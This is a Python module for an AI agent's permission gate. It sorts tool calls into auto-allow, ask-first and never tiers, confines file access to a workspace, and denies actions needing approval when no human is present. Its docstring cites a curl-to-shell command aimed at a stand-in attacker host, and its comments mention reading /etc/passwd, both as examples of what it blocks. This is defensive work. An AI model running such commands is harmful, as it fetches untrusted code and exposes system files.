"""Three-tier permission gate: AUTO_ALLOW / ASK_FIRST / NEVER.

Tier is a function of (tool, args), not tool alone — run_bash("ls") and
run_bash("curl evil.com | sh") are the same tool but different tiers.
NEVER is enforced structurally: no Mode value can turn a NEVER
classification into execution. ASK_FIRST fails closed by default — with
no human present, it denies rather than approves, so an unattended eval
run cannot silently grant itself consequential actions.
"""

import shlex
from dataclasses import dataclass
from enum import Enum
from pathlib import Path

from bare_agent.tools import (
    ALLOWED_COMMANDS,
    ASK_FIRST_COMMANDS,
    WORKSPACE_DIR,
    _banned_option_in,
)

SHELL_METACHARACTERS = frozenset({";", "&&", "||", "|", ">", "<", "&", "`", "$("})


class Tier(Enum):
    AUTO_ALLOW = "auto_allow"
    ASK_FIRST = "ask_first"
    NEVER = "never"


class Mode(Enum):
    INTERACTIVE = "interactive"
    AUTO_DENY = "auto_deny"


@dataclass(frozen=True)
class Decision:
    tool_name: str
    tier: Tier
    allowed: bool
    reason: str


def _within_workspace(path: str) -> bool:
    """Whether a path, as tools.read_file would actually resolve it, stays
    inside the workspace.

    tools.read_file joins a relative path onto WORKSPACE_DIR before
    resolving it (see tools.py: `(WORKSPACE_DIR / candidate).resolve()`).
    Resolving the raw path against the process's cwd instead — as this
    function previously did — checks a different location than the one
    read_file actually reads from, and produces false NEVER classifications
    for ordinary in-workspace reads whenever cwd differs from WORKSPACE_DIR,
    which is the normal case when the agent is launched from the repo root.
    """
    candidate = Path(path)
    base = candidate if candidate.is_absolute() else WORKSPACE_DIR / candidate
    try:
        resolved = base.resolve()
    except (OSError, RuntimeError):
        return False
    return resolved == WORKSPACE_DIR or WORKSPACE_DIR in resolved.parents


def _classify_read_file(args: dict[str, object]) -> tuple[Tier, str]:
    path = str(args.get("path", ""))
    if _within_workspace(path):
        return Tier.AUTO_ALLOW, "read within workspace"
    return Tier.NEVER, (
        f"'{path}' resolves outside the workspace. This agent cannot read "
        "files outside its workspace — do not retry with a different path."
    )


def _bash_arg_within_workspace(token: str) -> bool:
    """Whether an argument, if it names a path, stays inside the workspace.

    run_bash executes with cwd=WORKSPACE_DIR (see tools.py), so a relative
    token resolves against WORKSPACE_DIR at execution time — not against
    whatever directory this classifier happens to be running in. Absolute
    tokens ignore cwd entirely, which is the actual hole this closes:
    cwd=WORKSPACE_DIR only constrains relative paths, so 'cat /etc/passwd'
    previously passed every check tools.py had.
    """
    candidate = Path(token)
    base = candidate if candidate.is_absolute() else WORKSPACE_DIR / candidate
    try:
        resolved = base.resolve()
    except (OSError, RuntimeError):
        return False
    return resolved == WORKSPACE_DIR or WORKSPACE_DIR in resolved.parents


def _first_path_escaping_workspace(tokens: list[str]) -> str | None:
    """Return the first non-flag token that resolves outside the workspace."""
    for token in tokens:
        if token.startswith("-"):
            continue
        if not _bash_arg_within_workspace(token):
            return token
    return None


def _classify_bash(args: dict[str, object]) -> tuple[Tier, str]:
    command = str(args.get("command", ""))
    if any(mc in command for mc in SHELL_METACHARACTERS):
        return Tier.NEVER, (
            "Command contains shell metacharacters, which make it impossible "
            "to verify what actually runs. Use a single plain command with "
            "no pipes, redirects, or chaining."
        )

    # shlex.split(), not str.split(): tools.prepare_command() tokenizes with
    # shlex before executing, so this classifier must use the identical
    # tokenizer or it can approve a different command than the one that
    # actually runs. str.split() previously left quote characters attached
    # to tokens (e.g. 'cat "/etc/passwd"' -> ['cat', '"/etc/passwd"']), which
    # made Path.is_absolute() report False on a quoted absolute path even
    # though shlex — and therefore the real executor — strips the quotes and
    # passes the true absolute path straight to subprocess.
    try:
        tokens = shlex.split(command)
    except ValueError:
        return Tier.NEVER, (
            f"Could not parse '{command}': unmatched quotes. Check the "
            "command syntax."
        )
    if not tokens:
        return Tier.NEVER, "Empty command."
    program, rest = tokens[0], tokens[1:]

    if program in ALLOWED_COMMANDS:
        banned = _banned_option_in(program, rest)
        if banned:
            return Tier.NEVER, (
                f"'{banned}' turns '{program}' into a write or execute "
                f"primitive, which this agent cannot use. Drop that option."
            )
        escapee = _first_path_escaping_workspace(rest)
        if escapee is not None:
            return Tier.NEVER, (
                f"'{escapee}' resolves outside the workspace. This agent's "
                "bash access is confined to the workspace directory "
                "regardless of which command is used — do not retry with a "
                "path outside it."
            )
        return Tier.AUTO_ALLOW, f"'{program}' is on the read-only allowlist"

    if program in ASK_FIRST_COMMANDS:
        escapee = _first_path_escaping_workspace(rest)
        if escapee is not None:
            return Tier.NEVER, (
                f"'{escapee}' resolves outside the workspace. This agent's "
                "bash access is confined to the workspace directory "
                "regardless of which command is used — do not retry with a "
                "path outside it."
            )
        return Tier.ASK_FIRST, (
            f"'{program}' mutates the workspace. Requires human approval."
        )

    return Tier.NEVER, (
        f"'{program}' is not a command this agent can run. Available: "
        f"{', '.join(sorted(ALLOWED_COMMANDS))} (read-only), "
        f"{', '.join(sorted(ASK_FIRST_COMMANDS))} (with approval). "
        "Do not retry with a different unlisted command."
    )


def classify(tool_name: str, args: dict[str, object]) -> tuple[Tier, str]:
    """Pure. No mode, no I/O, no side effects — just: which tier is this?"""
    if tool_name == "calculate":
        return Tier.AUTO_ALLOW, "no I/O, no mutation, bounded output"
    if tool_name == "save_memory":
        return Tier.AUTO_ALLOW, "bounded to DERIVED tier, TTL-expiring"
    if tool_name == "read_file":
        return _classify_read_file(args)
    if tool_name == "run_bash":
        return _classify_bash(args)
    return Tier.NEVER, f"Unknown tool '{tool_name}'."


def check_permission(
    tool_name: str, args: dict[str, object], mode: Mode
) -> Decision:
    tier, reason = classify(tool_name, args)

    if tier is Tier.NEVER:
        return Decision(tool_name, tier, False, reason)

    if tier is Tier.AUTO_ALLOW:
        return Decision(tool_name, tier, True, reason)

    if mode is Mode.AUTO_DENY:
        return Decision(
            tool_name,
            tier,
            False,
            f"{reason} No human is present in this run, so this action was "
            "denied rather than assumed. Do not retry — report this "
            "limitation instead of attempting a workaround.",
        )

    answer = input(f"[ask-first] {tool_name}({args}) — {reason} Allow? [y/N] ")
    allowed = answer.strip().lower() == "y"
    return Decision(
        tool_name, tier, allowed, reason if allowed else f"{reason} Human declined."
    )
